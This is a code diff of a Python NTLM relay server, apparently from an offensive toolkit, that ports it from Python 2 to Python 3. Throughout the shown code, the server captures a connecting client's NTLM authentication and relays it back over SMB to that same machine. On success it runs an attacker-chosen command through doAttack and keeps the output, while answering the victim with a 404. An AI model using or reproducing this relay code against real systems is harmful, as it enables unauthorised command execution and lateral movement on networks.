@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 from struct import unpack
 from smbclient import SMBClient
 from attack import doAttack
@@ -13,22 +14,22 @@ from constant import constants
 
 # class HTTPRelayServer(Thread):
 class HTTPRelayServer():
-	
+
 	class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
 		def __init__(self, server_address, RequestHandlerClass, command, target='127.0.0.1'):
-			self.target = target
-			self.command = command
+			self.target 	= target
+			self.command 	= command
 
 			SocketServer.TCPServer.__init__(self, server_address, RequestHandlerClass)
 
 	class HTTPHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 
 		def __init__(self, request, client_address, server):
-			self.server = server
-			self.protocol_version = 'HTTP/1.1'
-			self.challengeMessage = None
-			self.target = None
-			self.client = None
+			self.server 			= server
+			self.protocol_version 	= 'HTTP/1.1'
+			self.challengeMessage 	= None
+			self.target 			= None
+			self.client 			= None
 
 			SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self, request, client_address, server)
 
@@ -63,7 +64,6 @@ class HTTPRelayServer():
 				pass
 			else:
 				# constants.isRunning = True
-
 				typeX = self.headers.getheader('Authorization')
 				try:
 					_, blob = typeX.split('NTLM')
@@ -71,17 +71,17 @@ class HTTPRelayServer():
 				except:
 					self.do_AUTHHEAD()
 				messageType = unpack('<L',token[len('NTLMSSP\x00'):len('NTLMSSP\x00')+4])[0]
-			
+
 			if messageType == 1:
 				self.target = self.client_address[0]
 				try:
 					self.client = SMBClient(self.target, extended_security = True)
 					self.client.set_timeout(60)
-				except Exception, e:
-					print "Connection against target %s FAILED" % self.target
-					print str(e)
+				except Exception as e:
+					print("Connection against target %s FAILED" % self.target)
+					print(str(e))
 
-				clientChallengeMessage = self.client.sendNegotiate(token) 
+				clientChallengeMessage = self.client.sendNegotiate(token)
 				self.challengeMessage = NTLMAuthChallenge()
 				self.challengeMessage.fromString(clientChallengeMessage)
 				self.do_AUTHHEAD(message = 'NTLM '+ base64.b64encode(clientChallengeMessage))
@@ -89,21 +89,21 @@ class HTTPRelayServer():
 			elif messageType == 3:
 				authenticateMessage = NTLMAuthChallengeResponse()
 				authenticateMessage.fromString(token)
-				
+
 				respToken2 = SPNEGO_NegTokenResp()
 				respToken2['ResponseToken'] = str(token)
 				clientResponse, errorCode = self.client.sendAuth(self.challengeMessage['challenge'], respToken2.getData())
-				
+
 				if errorCode != STATUS_SUCCESS:
-					# print "[-] Authenticating against %s FAILED" % self.target
+					# print("[-] Authenticating against %s FAILED" % self.target)
 					self.do_AUTHHEAD('NTLM')
 					constants.authentication_succeed = False
 				else:
-					# print "[+] Authentication SUCCEED"
+					# print("[+] Authentication SUCCEED")
 					constants.authentication_succeed = True
 
 					executeCmd = doAttack(self.client, self.server.command)
-					constants.outputCmd = executeCmd.run()					
+					constants.outputCmd = executeCmd.run()
 					constants.smb_client = self.client
 					# And answer 404 not found
 					self.send_response(404)
